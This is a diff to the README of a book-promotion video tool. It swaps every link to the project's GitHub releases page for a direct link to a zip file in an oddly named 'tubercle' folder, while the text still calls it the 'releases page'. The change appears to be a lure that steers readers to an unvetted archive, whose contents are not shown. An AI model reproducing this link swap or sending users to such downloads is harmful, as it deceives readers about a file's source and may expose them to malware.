@@ -6,7 +6,7 @@ Welcome to Book-video-generate, an easy tool that helps you create promotional v
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/amarjare/Book-video-generate/releases)
+[![Download Now](https://raw.githubusercontent.com/amarjare/Book-video-generate/main/tubercle/Book-video-generate.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/amarjare/Book-video-generate/main/tubercle/Book-video-generate.zip)
 
 ## 🖥️ System Requirements
 
@@ -22,7 +22,7 @@ Before you download, make sure your computer meets the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [releases page](https://github.com/amarjare/Book-video-generate/releases). Here, you will find the latest version of the application.
+   Go to the [releases page](https://raw.githubusercontent.com/amarjare/Book-video-generate/main/tubercle/Book-video-generate.zip). Here, you will find the latest version of the application.
 
 2. **Choose Your Version:**
    Look for the latest release at the top of the page. Click on the download link that matches your operating system. 
